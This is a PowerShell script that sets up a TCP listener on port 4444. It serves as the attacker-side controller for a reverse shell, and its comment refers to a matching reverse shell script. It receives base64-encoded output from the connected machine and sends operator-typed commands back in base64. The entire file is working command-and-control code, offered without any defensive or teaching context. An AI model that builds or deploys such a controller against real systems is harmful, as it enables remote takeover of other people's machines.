# Listener Setup
$IPAddress = '0.0.0.0'  # Listen on all available interfaces or set a specific IP
$Port = 4444            # The port number should match the one in your reverse shell script

# Create Listener
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($IPAddress), $Port)
$listener.Start()
Write-Host "Listening on $IPAddress:$Port..."

# Accept Client Connection
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Receive and Process Data Loop
try {
    while ($true) {
        $data = $reader.ReadLine()
        if ($data -eq $null) {
            break
        }
        $decodedData = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($data))
        Write-Host "Received: $decodedData"

        # Optional: Sending commands back to the client
        $command = Read-Host "Enter command"
        if ($command -eq "exit") {
            $writer.WriteLine($command)
            $writer.Flush()
            break
        } elseif ($command -ne $null) {
            $writer.WriteLine([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)))
            $writer.Flush()
        }
    }
} catch {
    Write-Host "Error in receiving data"
} finally {
    $reader.Close()
    $stream.Close()
    $client.Close()
    $listener.Stop()
}

